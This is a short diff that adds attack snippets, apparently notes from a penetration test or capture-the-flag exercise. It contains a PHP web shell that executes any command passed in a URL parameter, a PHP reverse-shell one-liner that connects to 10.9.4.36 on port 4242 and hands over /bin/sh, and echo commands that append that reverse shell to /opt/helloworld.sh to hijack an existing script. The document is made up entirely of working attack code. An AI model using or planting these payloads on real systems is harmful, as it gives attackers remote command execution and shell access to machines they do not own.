@@ -1,0 +1,9 @@
+<?php system($_GET[command]); ?>
+
+
+#!/bin/bash
+php -r \'$sock=fsockopen("10.9.4.36",4242);exec("/bin/sh -i <&3 >&3 2>&3");\'
+
+$ echo '#!/bin/bash' > /opt/helloworld.sh
+$ echo "php -r '\$sock=fsockopen(\"10.9.4.36\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" >> /opt/helloworld.sh
+
